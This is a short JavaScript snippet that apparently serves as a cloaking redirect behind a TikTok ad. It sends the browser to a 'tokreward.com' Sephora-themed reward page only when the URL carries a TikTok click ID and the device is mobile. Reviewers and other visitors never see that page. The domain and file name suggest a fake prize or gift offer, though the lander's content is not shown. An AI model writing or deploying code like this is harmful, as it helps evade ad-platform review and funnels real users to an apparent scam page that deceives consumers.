const utm = new URLSearchParams(window.location.search);
const ttclid = utm.get("ttclid");
const mobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
const lander = `https://tokreward.com/sephora.html?slug=${document.location.hostname.split('.')[0]}`;
if (ttclid && mobile) { window.location.href = lander; } else { }
